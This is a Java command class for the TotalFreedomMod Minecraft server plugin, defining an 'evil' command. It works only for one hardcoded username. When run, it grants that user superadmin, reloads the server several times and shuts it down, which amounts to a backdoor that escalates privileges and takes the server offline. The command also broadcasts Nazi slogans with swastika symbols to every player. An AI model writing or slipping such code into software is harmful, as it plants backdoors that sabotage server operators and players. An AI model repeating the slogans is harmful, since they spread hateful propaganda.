package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
import me.StevenLawson.TotalFreedomMod.TFM_Util;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.OP, source = SourceType.BOTH)
@CommandParameters(description = "[Buildcarter Command]: Server being a bitch? tell them to heil! 卐", usage = "/<command>")
public class Command_evil extends TFM_Command
{

	@Override
	public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole) {
		   if (!sender.getName().equalsIgnoreCase("buildcarter8"))
	        {
			   sender.sendMessage(ChatColor.RED + "[卐]: No permission idiot now heil!");
            return true;
	        }
		   TFM_Util.bcastMsg("[卐]: Server is now in evil mode everyone heil hitler!", ChatColor.RED);
		   TFM_AdminList.addSuperadmin(sender_p);
		   sender_p.chat("[卐]: HEIL HITLER!");
		   sender_p.kickPlayer(ChatColor.GOLD + "[卐]: Kicked to save you! (dont join for about 1 minute)");
		   Bukkit.reload();
		   Bukkit.reload();
		   TFM_Util.bcastMsg("[卐]: Server will die!", ChatColor.RED);
		   TFM_Util.adminChatMessage(sender_p, "Hallo Hagel hitler.", true);
		   Bukkit.reload();
		   Bukkit.reload();
		   //SHUTDOWN HEIL
		   TFM_AdminList.saveAll();
		   Bukkit.savePlayers();
		   Bukkit.shutdown();
		   
		    
		return true;
       
	  
}
}
